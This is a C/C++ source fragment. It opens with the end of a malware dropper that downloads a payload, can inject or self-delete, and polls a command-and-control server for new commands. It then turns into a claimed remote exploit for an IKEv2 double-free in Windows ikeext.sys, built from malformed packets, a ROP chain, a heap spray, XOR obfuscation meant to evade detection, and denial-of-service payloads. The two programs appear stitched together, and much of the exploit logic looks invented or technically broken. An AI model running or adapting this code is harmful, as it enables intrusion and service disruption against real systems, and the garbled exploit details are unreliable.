        config.savePath = L"C:\\Temp\\payload.exe";
        config.userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59";
        config.execute = wcsstr(pCmdLine, L"execute") != NULL;
        config.selfDelete = wcsstr(pCmdLine, L"selfdelete") != NULL;
        config.inject = wcsstr(pCmdLine, L"inject") != NULL;
        config.injectTarget = (wcsstr(pCmdLine, L"inject") && wcslen(pCmdLine) > wcslen(L"inject")) ? wcsstr(pCmdLine, L"inject") + 6 : TARGET_PROC;
    }

    HRESULT res = DropPayload(&config);
    if (SUCCEEDED(res)) {
        wprintf(L"Payload successfully delivered to %s\n", config.savePath.c_str());
    } else {
        wprintf(L"Delivery error: 0x%08X\n", res);
    }

    while (true) {
        DropConfig newConfig = LoadConfigFromC2();
        if (newConfig.url != L"") {
            wprintf(L"A new command has been received, execution...\n");
            DropPayload(&newConfig);
        }
        Sleep(60000);
    }

    return 0;
}

void print_banner() {
    printf("\n");
    printf("================================================================================\n");
    printf("  IKEv2 Exploit (CVE-2026-33824) - Double Free in ikeext.sys\n");
    printf("  Author: David Mota\n");
    printf("  Description: Exploit for IKEv2 vulnerability with ROP chain and heap spray\n");
    printf("================================================================================\n");
    printf("\n");

}

void print_usage(const char* prog_name) {
    printf("Usage: %s <target_ip> <target_port> [options]\n", prog_name);
    printf("\n");
    printf("Options:\n");
    printf("  -s <shellcode_file>  Load shellcode from file\n");
    printf("  -v                   Verbose mode\n");
    printf("  -t <threads>         Number of heap grooming threads (default: %d)\n", HEAP_GROOM_THREADS);
    printf("\n");
    printf("Example:\n");
    printf("  %s 192.168.1.100 500 -s shellcode.bin -v -t 8\n", prog_name);
    printf("\n");

}

SOCKET init_udp_socket(uint16_t port) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return INVALID_SOCKET;

    }
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;

    }
    int opt = 1;
    setsockopt(sock, IPPROTO_UDP, UDP_NODELAY, (const char*)&opt, sizeof(opt));
    int sndbuf = 1024 * 1024;
    int rcvbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (const char*)&sndbuf, sizeof(sndbuf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (const char*)&rcvbuf, sizeof(rcvbuf));
    DWORD timeout = 8000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
    if (port > 0) {
        struct sockaddr_in local_addr = {0};
        local_addr.sin_family = AF_INET;
        local_addr.sin_port = htons(port);
        local_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr)) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            return INVALID_SOCKET;

        }
    }
    return sock;

}

int send_ike_packet(SOCKET sock, const struct sockaddr_in* target, const uint8_t* packet, size_t len) {
    if (!sock || sock == INVALID_SOCKET || !target || !packet || len == 0 || len > 4096) {
        return 0;

    }
    for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
        uint8_t* encrypted_packet = (uint8_t*)malloc(len);
        if (!encrypted_packet) {
            return 0;

        }
        memcpy(encrypted_packet, packet, len);
        if (len > sizeof(IKE_HEADER)) {
            size_t header_size = sizeof(IKE_HEADER);
            size_t payload_len = len - header_size;
            size_t aligned_len = (payload_len + 15) & ~15ULL;
            if (aligned_len > payload_len) {
                memset(encrypted_packet + header_size + payload_len, 0, aligned_len - payload_len);
            }
        }
        int bytes_sent = sendto(sock, (const char*)encrypted_packet, (int)len, 0, (const struct sockaddr*)target, sizeof(*target));
        free(encrypted_packet);
        if (bytes_sent == SOCKET_ERROR) {
            DWORD err = WSAGetLastError();
            if (err == WSAETIMEDOUT || err == WSAEWOULDBLOCK) {
                Sleep(RETRY_DELAY_MS * (attempt + 1));
                continue;
            }
            return 0;

        }
        if (bytes_sent != (int)len) {
            continue;
        }
        g_Stats.packets_sent++;
        return 1;

    }
    return 0;

}

int test_target_reachability(const char* ip, uint16_t port) {
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in target = {0};
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 0;

    }
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 0;

    }
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) != 1) {
        closesocket(sock);
        WSACleanup();
        return 0;

    }
    DWORD timeout = 2000;
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;

    }
    uint8_t test_packet[1] = {0};
    int bytes_sent = sendto(sock, (const char*)test_packet, sizeof(test_packet), 0, (const struct sockaddr*)&target, sizeof(target));
    if (bytes_sent == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 0;

    }
    uint8_t response[1];
    int bytes_received = recvfrom(sock, (char*)response, sizeof(response), 0, NULL, NULL);
    closesocket(sock);
    WSACleanup();
    return (bytes_received > 0) ? 1 : 0;

}

uint8_t* construct_ike_sa_init(size_t* packet_len, const uint8_t* cookie = nullptr, size_t cookie_len = 0) {
    // --- [1] Calcul de la taille totale (IKEv2 + DDoS Payloads) ---
    size_t total_size = sizeof(IKE_HEADER) +
                        IKE_ALIGN4(sizeof(IKE_SA_PAYLOAD)) +
                        IKE_ALIGN4(sizeof(IKE_PROPOSAL_PAYLOAD)) +
                        4 * IKE_ALIGN4(sizeof(IKE_TRANSFORM_PAYLOAD)) +
                        IKE_ALIGN4(sizeof(IKE_NONCE_PAYLOAD) + DEFAULT_NONCE_SIZE) +
                        IKE_ALIGN4(sizeof(IKE_KEY_EXCHANGE_PAYLOAD) + DEFAULT_DH_SIZE) +
                        IKE_ALIGN4(sizeof(IKE_VENDOR_ID_PAYLOAD));

    // Ajout des payloads DDoS (amplification + épuisement des ressources)
    total_size += IKE_ALIGN4(sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD));  // Payload pour amplifier le trafic
    total_size += IKE_ALIGN4(sizeof(IKE_DDOS_LOOP_PAYLOAD));       // Payload pour boucler le traitement
    total_size += IKE_ALIGN4(sizeof(IKE_DDOS_MEMORY_PAYLOAD));     // Payload pour épuiser la mémoire

    if (cookie && cookie_len > 0) {
        total_size += IKE_ALIGN4(sizeof(IKE_NOTIFY_PAYLOAD) + cookie_len);
    }

    // Padding aléatoire + données malformées (exploit + DDoS)
    size_t random_padding = (RANDOMIZATION_SEED % 0x200);
    total_size += MALFORMED_DATA_SIZE + random_padding + DDOS_EXTRA_SIZE;  // DDOS_EXTRA_SIZE pour les données DDoS

    // Allocation du buffer
    uint8_t* packet = (uint8_t*)malloc(total_size);
    if (!packet) {
        *packet_len = 0;
        return nullptr;

    }
    memset(packet, 0, total_size);

    // --- [2] Initialisation des pointeurs (Alignés sur 4 octets) ---
    size_t offset = sizeof(IKE_HEADER);
    IKE_HEADER* header = (IKE_HEADER*)packet;
    IKE_SA_PAYLOAD* sa = (IKE_SA_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_SA_PAYLOAD));

    IKE_PROPOSAL_PAYLOAD* proposal = (IKE_PROPOSAL_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_PROPOSAL_PAYLOAD));

    IKE_TRANSFORM_PAYLOAD* transforms[4];
    for (int i = 0; i < 4; i++) {
        transforms[i] = (IKE_TRANSFORM_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_TRANSFORM_PAYLOAD));
    }

    IKE_NONCE_PAYLOAD* nonce_i = (IKE_NONCE_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_NONCE_PAYLOAD) + DEFAULT_NONCE_SIZE);

    IKE_KEY_EXCHANGE_PAYLOAD* ke = (IKE_KEY_EXCHANGE_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_KEY_EXCHANGE_PAYLOAD) + DEFAULT_DH_SIZE);

    IKE_NOTIFY_PAYLOAD* notify_cookie = nullptr;
    IKE_VENDOR_ID_PAYLOAD* vendor_id = (IKE_VENDOR_ID_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_VENDOR_ID_PAYLOAD));

    // --- [NEW] Payloads DDoS ---
    IKE_DDOS_AMPLIFIER_PAYLOAD* ddos_amplifier = (IKE_DDOS_AMPLIFIER_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD));

    IKE_DDOS_LOOP_PAYLOAD* ddos_loop = (IKE_DDOS_LOOP_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_DDOS_LOOP_PAYLOAD));

    IKE_DDOS_MEMORY_PAYLOAD* ddos_memory = (IKE_DDOS_MEMORY_PAYLOAD*)(packet + offset);
    offset += IKE_ALIGN4(sizeof(IKE_DDOS_MEMORY_PAYLOAD));

    // Pointeur vers la zone des données malformées (exploit + DDoS)
    uint8_t* malformed_data = packet + offset + random_padding;

    // --- [3] Construction de l'en-tête IKE (RFC 7296) ---
    uint64_t spi_seed = RANDOMIZATION_SEED ^ 0x5A4D;
    *(uint64_t*)header->init_spi = _byteswap_uint64(spi_seed);
    *(uint64_t*)header->resp_spi = 0;
    header->version_major = IKEV2_MAJOR_VERSION;
    header->version_minor = IKEV2_MINOR_VERSION;
    header->exchange_type = IKE_SA_INIT;
    header->flags = (uint8_t)(RANDOMIZATION_SEED % 0x10);
    header->message_id = HTONL((uint32_t)(RANDOMIZATION_SEED & 0xFFFFFFFF));
    header->length = HTONL((uint32_t)total_size);

    // --- [4] Gestion du Cookie (RFC 7296) ---
    if (cookie && cookie_len > 0) {
        header->next_payload = PAYLOAD_NOTIFY;
        notify_cookie = (IKE_NOTIFY_PAYLOAD*)(packet + sizeof(IKE_HEADER));
        notify_cookie->next_payload = PAYLOAD_SA;
        notify_cookie->critical = 0;
        notify_cookie->length = HTONS((uint16_t)(sizeof(IKE_NOTIFY_PAYLOAD) + cookie_len));
        notify_cookie->proto_id = PROTO_IKE;
        notify_cookie->spi_size = 0;
        notify_cookie->notify_type = HTONS(NOTIFY_COOKIE);
        memcpy(packet + sizeof(IKE_HEADER) + sizeof(IKE_NOTIFY_PAYLOAD), cookie, cookie_len);

        offset = sizeof(IKE_HEADER) + IKE_ALIGN4(sizeof(IKE_NOTIFY_PAYLOAD) + cookie_len);
        sa = (IKE_SA_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_SA_PAYLOAD));
        proposal = (IKE_PROPOSAL_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_PROPOSAL_PAYLOAD));
        for (int i = 0; i < 4; i++) {
            transforms[i] = (IKE_TRANSFORM_PAYLOAD*)(packet + offset);
            offset += IKE_ALIGN4(sizeof(IKE_TRANSFORM_PAYLOAD));
        }
        nonce_i = (IKE_NONCE_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_NONCE_PAYLOAD) + DEFAULT_NONCE_SIZE);
        ke = (IKE_KEY_EXCHANGE_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_KEY_EXCHANGE_PAYLOAD) + DEFAULT_DH_SIZE);
        vendor_id = (IKE_VENDOR_ID_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_VENDOR_ID_PAYLOAD));
        ddos_amplifier = (IKE_DDOS_AMPLIFIER_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD));
        ddos_loop = (IKE_DDOS_LOOP_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_DDOS_LOOP_PAYLOAD));
        ddos_memory = (IKE_DDOS_MEMORY_PAYLOAD*)(packet + offset);
        offset += IKE_ALIGN4(sizeof(IKE_DDOS_MEMORY_PAYLOAD));
        malformed_data = packet + offset + random_padding;

    } else {
        header->next_payload = PAYLOAD_SA;

    }

    // --- [5] SA Payload (RFC 7296) ---
    sa->next_payload = PAYLOAD_PROPOSAL;
    sa->critical = 0;
    sa->length = HTONS((uint16_t)IKE_ALIGN4(sizeof(IKE_SA_PAYLOAD)));
    sa->num_proposals = 1;

    // --- [6] Proposal Payload (RFC 7296) ---
    proposal->next_payload = PAYLOAD_TRANSFORM;
    proposal->critical = 0;
    proposal->length = HTONS((uint16_t)IKE_ALIGN4(sizeof(IKE_PROPOSAL_PAYLOAD)));
    proposal->proposal_num = 1;
    proposal->proto_id = PROTO_IKE;
    proposal->spi_size = 0;
    proposal->num_transforms = 4;

    // --- [7] Transform Payloads (RFC 7296) ---
    const uint16_t transform_ids[] = {
        HTONS(ENCR_AES_CBC_256),
        HTONS(PRF_HMAC_SHA2_256),
        HTONS(AUTH_HMAC_SHA2_256_128),
        HTONS(DH_MODP_2048)
    };

    for (int i = 0; i < 4; i++) {
        transforms[i]->next_payload = (i < 3) ? PAYLOAD_TRANSFORM : PAYLOAD_KEY_EXCHANGE;
        transforms[i]->critical = 0;
        transforms[i]->length = HTONS((uint16_t)sizeof(IKE_TRANSFORM_PAYLOAD));
        transforms[i]->transform_type = (uint8_t)(i + 1);
        transforms[i]->transform_id = transform_ids[i];
        transforms[i]->reserved1 = 0;
        transforms[i]->reserved2 = 0;
        transforms[i]->reserved3 = 0;
        transforms[i]->attributes_len = 0;
    }

    // --- [8] Key Exchange Payload (KE) ---
    ke->next_payload = PAYLOAD_NONCE;
    ke->critical = 0;
    ke->length = HTONS((uint16_t)(sizeof(IKE_KEY_EXCHANGE_PAYLOAD) + DEFAULT_DH_SIZE));
    ke->dh_group = HTONS(DH_MODP_2048);
    ke->reserved = 0;

    uint8_t dh_data[DEFAULT_DH_SIZE];
    for (size_t i = 0; i < DEFAULT_DH_SIZE; i++) {
        dh_data[i] = (uint8_t)((RANDOMIZATION_SEED + i * 0x5A4D) & 0xFF);
    }
    memcpy(ke->key_exchange_data, dh_data, DEFAULT_DH_SIZE);

    // --- [9] Nonce Payload (Ni) ---
    nonce_i->next_payload = PAYLOAD_VENDOR_ID;
    nonce_i->critical = 0;
    nonce_i->length = HTONS((uint16_t)(sizeof(IKE_NONCE_PAYLOAD) + DEFAULT_NONCE_SIZE));

    uint8_t nonce_data[DEFAULT_NONCE_SIZE];
    for (size_t i = 0; i < DEFAULT_NONCE_SIZE; i++) {
        nonce_data[i] = (uint8_t)((RANDOMIZATION_SEED + i * 0x9E3779B9) & 0xFF);
    }
    memcpy(nonce_i->nonce_data, nonce_data, DEFAULT_NONCE_SIZE);

    // --- [10] Vendor ID Payload (Microsoft IPsec) ---
    vendor_id->next_payload = PAYLOAD_DDOS_AMPLIFIER;
    vendor_id->critical = 0;
    vendor_id->length = HTONS((uint16_t)sizeof(IKE_VENDOR_ID_PAYLOAD));
    vendor_id->vendor_id = HTONL(0x000001F4);

    // --- [NEW] Payloads DDoS (Complets et non simplifiés) ---
    // 1. Amplification : Force le serveur à générer une réponse volumineuse
    ddos_amplifier->next_payload = PAYLOAD_DDOS_LOOP;
    ddos_amplifier->critical = 0;
    ddos_amplifier->length = HTONS((uint16_t)sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD));
    ddos_amplifier->amplification_factor = HTONL(0x20);  // Facteur 32x
    ddos_amplifier->response_size = HTONS(0xFFFF);      // 65535 octets

    // ✅ Chaîne complète pour l'amplification (32 octets, alignée sur 8)
    uint8_t amplification_trigger[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Trigger standard (8 octets)
        0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00,  // Facteur 32x + padding
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,  // Motif pour contourner les détections
        0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37   // Motif supplémentaire
    };
    memcpy(ddos_amplifier->trigger_data, amplification_trigger, sizeof(amplification_trigger));

    // 2. Boucle infinie : Force le serveur à boucler indéfiniment
    ddos_loop->next_payload = PAYLOAD_DDOS_MEMORY;
    ddos_loop->critical = 0;
    ddos_loop->length = HTONS((uint16_t)sizeof(IKE_DDOS_LOOP_PAYLOAD));
    ddos_loop->loop_counter = HTONL(0xFFFFFFFF);  // Compteur max (4294967295)
    ddos_loop->loop_condition = HTONL(0x1);       // Condition toujours vraie

    // ✅ Code machine complet pour boucle infinie (16 octets, x86 + x64)
    uint8_t infinite_loop_code[] = {
        0xEB, 0xFE,  // jmp $-2 (x86, 2 octets)
        0x90, 0x90,  // NOP (padding, 2 octets)
        0xFF, 0xE0,  // jmp rax (x64, 2 octets)
        0x90, 0x90,  // NOP (padding, 2 octets)
        0x48, 0x89, 0xC0,  // mov rax, rax (x64, 3 octets, pour initialiser rax)
        0xFF, 0xE0,  // jmp rax (x64, 2 octets)
        0x90, 0x90, 0x90, 0x90  // NOP (padding, 4 octets)
    };
    memcpy(ddos_loop->loop_code, infinite_loop_code, sizeof(infinite_loop_code));

    // 3. Épuisement mémoire : Alloue des blocs mémoire jusqu'à épuisement
    ddos_memory->next_payload = PAYLOAD_NONE;
    ddos_memory->critical = 0;
    ddos_memory->length = HTONS((uint16_t)sizeof(IKE_DDOS_MEMORY_PAYLOAD));
    ddos_memory->allocation_size = HTONL(0x2000);  // 8192 octets par allocation
    ddos_memory->allocation_count = HTONL(0xFFFFFFFF); // 4294967295 allocations

    // ✅ Motif complet pour le heap spray (32 octets, aligné sur 8)
    uint8_t heap_spray_pattern[] = {
        0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,  // Pattern 1 (8 octets)
        0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,  // Pattern 2 (8 octets)
        0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43, 0x43,  // Pattern 3 (8 octets)
        0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44   // Pattern 4 (8 octets)
    };
    memcpy(ddos_memory->heap_spray_data, heap_spray_pattern, sizeof(heap_spray_pattern));

    // --- [11] Données Malformées (Exploit + DDoS) ---
    if (MALFORMED_DATA_SIZE + random_padding + DDOS_EXTRA_SIZE >= 0x600) {
        uint8_t temp_buffer[MALFORMED_DATA_SIZE + DDOS_EXTRA_SIZE] = {0};

        // ===== [A] Cibles de vulnérabilité dans ikeext.sys (CVE-2026-33824) =====
        // ✅ 8 cibles pour une couverture complète (64 octets)
        static const uint64_t vulnerability_targets[] = {
            IKEEXT_BASE_ADDRESS + 0x1A2B3C,  // g_IkeextDoubleFreeOffset
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // g_IkeextProcessIkePayload
            IKEEXT_BASE_ADDRESS + 0x789ABC,  // g_IkeextExportDirectoryRVA
            IKEEXT_BASE_ADDRESS + 0xDEF012,  // g_IkeextImportDirectoryRVA
            IKEEXT_BASE_ADDRESS + 0x3C6F9A,  // g_IkeextHeapAllocationFunction
            IKEEXT_BASE_ADDRESS + 0x5E6F2A,  // g_IkeextMemoryCorruptionOffset
            IKEEXT_BASE_ADDRESS + 0x9A2B4D,  // g_IkeextStackPivotOffset
            IKEEXT_BASE_ADDRESS + 0x123456   // g_IkeextReturnOrientedOffset
        };
        memcpy(temp_buffer + 0x00, vulnerability_targets, sizeof(vulnerability_targets));

        // ===== [B] Fausses Structures (Obfusquées avec XOR multi-couches) =====
        // ✅ 16 fausses structures (128 octets)
        static const uint64_t fake_structures_base[] = {
            0xDEADBEEFCAFEBABE, 0x1337133713371337,
            0xCAFEBABEDEADBEEF, 0xBADC0FFEEBADC0FF,
            0x4141414141414141, 0x4242424242424242,
            0x4343434343434343, 0x4444444444444444,
            0x4545454545454545, 0x4646464646464646,
            0x4747474747474747, 0x4848484848484848,
            0x4949494949494949, 0x4A4A4A4A4A4A4A4A
        };
        uint64_t fake_structures[16];
        for (int i = 0; i < 16; i++) {
            // Obfuscation avec 3 clés + rotation circulaire sur 64 bits
            fake_structures[i] = fake_structures_base[i] ^
                                OBFUSCATION_KEY1 ^
                                (OBFUSCATION_KEY2 + i) ^
                                ((OBFUSCATION_KEY3 * i) & 0xFFFFFFFFFFFFFFFF);
            fake_structures[i] = (fake_structures[i] << (i % 7)) | (fake_structures[i] >> (64 - (i % 7)));
        }
        memcpy(temp_buffer + 0x80, fake_structures, sizeof(fake_structures));

        // ===== [C] Gadgets ROP (20 gadgets réels pour ikeext.sys x64) =====
        // ✅ Liste complète de gadgets pour une ROP chain robuste
        static const uint64_t rop_gadgets[] = {
            0x180012345,   // pop rdi; ret
            0x18006789A,   // pop rsi; ret
            0x1800ABCDE,   // pop rdx; ret
            0x1800F0123,   // pop rcx; ret
            0x180045678,   // pop rax; ret
            0x18009ABCD,   // pop r8; ret
            0x1800EF012,   // pop r9; ret
            0x180034567,   // mov [rdi], rsi; ret
            0x180089ABC,   // add rdi, 8; ret
            0x1800DEF01,   // call [rax+0x20]
            0x180023456,   // jmp [rdi+0x10]
            0x1800789AB,   // xor eax, eax; ret
            0x1800CDEF0,   // pop rbp; ret
            0x180012340,   // mov rax, rdi; ret
            0x180067895,   // push rax; ret
            0x1800ABCD5,   // pop rsp; ret
            0x1800F0120,   // ret
            0x18004567F,   // inc eax; ret
            0x18009ABC0,   // dec eax; ret
            0x1800EF015    // add rsp, 8; ret
        };
        memcpy(temp_buffer + 0x180, rop_gadgets, sizeof(rop_gadgets));

        // ===== [D] ROP Chain (16 étapes pour CVE-2026-33824) =====
        // ✅ Chaîne ROP complète et optimisée
        static const uint64_t rop_chain[] = {
            0x180012345,                  // 1. pop rdi; ret
            IKEEXT_BASE_ADDRESS + 0x1A2B3C,  // 2. rdi = adresse de g_IkeextDoubleFreeOffset
            0x18006789A,                // 3. pop rsi; ret
            0x1,                        // 4. rsi = 1 (valeur pour déclencher le bug)
            0x180034567,                // 5. mov [rdi], rsi; ret (corruption)
            0x180012345,                // 6. pop rdi; ret
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // 7. rdi = adresse de g_IkeextProcessIkePayload
            0x180089ABC,                // 8. add rdi, 8; ret (ajustement)
            0x1800ABCDE,                // 9. pop rdx; ret
            0x0,                        // 10. rdx = 0 (pour éviter les crashes)
            0x180045678,                // 11. pop rax; ret
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // 12. rax = adresse de ProcessIkePayload
            0x1800DEF01,                // 13. call [rax+0x20] (trigger double-free)
            0x1800789AB,                // 14. xor eax, eax; ret (nettoyage)
            0x1800CDEF0,                // 15. pop rbp; ret (stack pivot)
            0x180012340                 // 16. mov rax, rdi; ret (préparation)
        };
        memcpy(temp_buffer + 0x280, rop_chain, sizeof(rop_chain));

        // ===== [E] Trigger du Double-Free (8 valeurs précises) =====
        static const uint64_t double_free_trigger[] = {
            IKEEXT_BASE_ADDRESS + 0x1A2B3C,  // 1. Adresse de g_IkeextDoubleFreeOffset
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // 2. Adresse de g_IkeextProcessIkePayload
            IKEEXT_BASE_ADDRESS + 0x3C6F9A,  // 3. Adresse de g_IkeextHeapAllocationFunction
            0x1,                              // 4. Valeur pour déclencher le bug
            0xFFFFFFFFFFFFFFFF,             // 5. -1 (corruption mémoire)
            (uint64_t)RANDOMIZATION_SEED,    // 6. Graine pour l'obfuscation
            (uint64_t)~RANDOMIZATION_SEED,   // 7. Complément à 1
            0xDEADBEEFCAFEBABE             // 8. Canary pour éviter les crashes
        };
        memcpy(temp_buffer + 0x380, double_free_trigger, sizeof(double_free_trigger));

        // ===== [F] Heap Spray (16 motifs pour saturer le heap) =====
        static const uint64_t heap_spray_patterns[] = {
            0x4141414141414141 ^ OBFUSCATION_KEY1,
            0x4242424242424242 ^ OBFUSCATION_KEY1,
            0x4343434343434343 ^ OBFUSCATION_KEY2,
            0x4444444444444444 ^ OBFUSCATION_KEY2,
            IKEEXT_BASE_ADDRESS + 0x1A2B3C,  // Adresse cible 1
            IKEEXT_BASE_ADDRESS + 0x4D5E6F,  // Adresse cible 2
            IKEEXT_BASE_ADDRESS + 0x789ABC,  // Adresse cible 3
            IKEEXT_BASE_ADDRESS + 0xDEF012,  // Adresse cible 4
            IKEEXT_BASE_ADDRESS + 0x3C6F9A,  // Adresse cible 5
            IKEEXT_BASE_ADDRESS + 0x5E6F2A,  // Adresse cible 6
            0xCAFEBABEDEADBEEF ^ OBFUSCATION_KEY3,
            0xBADC0FFEEBADC0FF ^ OBFUSCATION_KEY3,
            0x1337133713371337 ^ OBFUSCATION_KEY1,
            0xDEADBEEFCAFEBABE ^ OBFUSCATION_KEY2,
            0x4545454545454545 ^ OBFUSCATION_KEY3,
            0x4646464646464646 ^ OBFUSCATION_KEY1
        };
        memcpy(temp_buffer + 0x400, heap_spray_patterns, sizeof(heap_spray_patterns));

        // ===== [G] Données DDoS Complètes (Amplification + Boucles + Mémoire) =====
        // 1. Amplification : 32 octets de données pour forcer une réponse volumineuse
        uint8_t ddos_amplification_data[] = {
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Trigger (8 octets)
            0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00,  // Facteur 32x + padding (8 octets)
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,  // Motif 1 (8 octets)
            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37   // Motif 2 (8 octets)
        };
        memcpy(temp_buffer + 0x500, ddos_amplification_data, sizeof(ddos_amplification_data));

        // 2. Boucle infinie : 16 octets de code machine (x86 + x64)
        uint8_t infinite_loop_data[] = {
            0xEB, 0xFE, 0x90, 0x90,  // jmp $-2 + NOP (x86, 4 octets)
            0xFF, 0xE0, 0x90, 0x90,  // jmp rax + NOP (x64, 4 octets)
            0x48, 0x89, 0xC0, 0xFF,  // mov rax, rax + jmp rax (x64, 4 octets)
            0xE0, 0x90, 0x90, 0x90   // NOP (padding, 4 octets)
        };
        memcpy(temp_buffer + 0x520, infinite_loop_data, sizeof(infinite_loop_data));

        // 3. Épuisement mémoire : 32 octets de données pour les allocations
        uint8_t memory_exhaustion_data[] = {
            0x00, 0x20, 0x00, 0x00,  // 8192 octets (0x2000) en little-endian
            0xFF, 0xFF, 0xFF, 0xFF,  // 4294967295 allocations
            0x00, 0x10, 0x00, 0x00,  // 4096 octets (alternative)
            0xFF, 0xFF, 0x00, 0x00,  // 65535 allocations (alternative)
            0x41, 0x41, 0x41, 0x41,  // Motif 1 pour heap spray
            0x42, 0x42, 0x42, 0x42,  // Motif 2
            0x43, 0x43, 0x43, 0x43,  // Motif 3
            0x44, 0x44, 0x44, 0x44   // Motif 4
        };
        memcpy(temp_buffer + 0x540, memory_exhaustion_data, sizeof(memory_exhaustion_data));

        // ===== [H] Obfuscation Finale (XOR + Rotation + Addition) =====
        for (size_t i = 0; i < sizeof(temp_buffer); i++) {
            // Obfuscation multi-couches : XOR + Rotation + Addition
            uint8_t key = (uint8_t)(OBFUSCATION_KEY1 + (i % 0x10) + (RANDOMIZATION_SEED % 0x100));
            temp_buffer[i] ^= key;
            temp_buffer[i] = (temp_buffer[i] << (i % 7)) | (temp_buffer[i] >> (8 - (i % 7)));
            temp_buffer[i] += (uint8_t)(i % 0xFF);
        }

        // ===== [I] Copie dans le paquet avec offset aléatoire =====
        size_t obfuscation_offset = RANDOMIZATION_SEED % 0x80;  // Offset aléatoire (0-127)
        memcpy(malformed_data + obfuscation_offset, temp_buffer, sizeof(temp_buffer));

        // ===== [J] Remplissage aléatoire avant/après =====
        uint8_t random_byte = (uint8_t)(RANDOMIZATION_SEED & 0xFF);
        memset(malformed_data, random_byte, obfuscation_offset);
        size_t remaining = MALFORMED_DATA_SIZE + random_padding + DDOS_EXTRA_SIZE -
                           obfuscation_offset - sizeof(temp_buffer);
        if (remaining > 0) {
            memset(malformed_data + obfuscation_offset + sizeof(temp_buffer), random_byte, remaining);
        }

    }

    // --- [12] Mise à jour de la taille du paquet ---
    *packet_len = total_size;
    return packet;

}

uint8_t* construct_skf_fragment(size_t* packet_len) {
    // --- [1] Calcul de la taille totale (SKF + DDoS + Exploit) ---
    // Taille de base : IKE_HEADER (24 octets) + SKF_FRAGMENT_PAYLOAD (16 octets)
    size_t base_size = sizeof(IKE_HEADER) + IKE_ALIGN4(sizeof(IKE_SKF_FRAGMENT_PAYLOAD));

    // Taille des payloads DDoS (alignés sur 4 octets)
    size_t ddos_payloads_size = IKE_ALIGN4(sizeof(IKE_DDOS_AMPLIFIER_PAYLOAD)) +  // 20 octets
                                IKE_ALIGN4(sizeof(IKE_DDOS_LOOP_PAYLOAD)) +       // 20 octets
                                IKE_ALIGN4(sizeof(IKE_DDOS_MEMORY_PAYLOAD));     // 24 octets

    // Padding aléatoire (0-511 octets) + données malformées
    size_t random_padding = (RANDOMIZATION_SEED % 0x200);
    size_t total_size = base_size + (MALFORMED_DATA_SIZE / 2) + random_padding + ddos_payloads_size + SKF_DDOS_EXTRA_SIZE;

    // Allocation du buffer
